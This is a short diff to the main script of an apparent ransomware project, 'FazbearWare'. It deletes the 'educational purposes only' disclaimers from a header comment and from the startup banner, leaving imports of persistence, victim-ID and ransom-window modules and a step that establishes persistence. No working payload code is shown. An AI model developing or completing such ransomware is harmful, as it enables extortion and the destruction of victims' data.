@@ -1,5 +1,3 @@
-#This Code was maded only for edicational and learning purposes, i wanted to learn how ransomware works 
-
 
 import persistence
 import victim_ID
@@ -9,7 +7,6 @@ import ransom_window_UI
 def run_fazbearware():
     print("""
     [!] FazbearWare Framework Loading...
-    [!] Educational purposes only.
     """)
 
     # 1. ESTABLISH PERSISTENCE
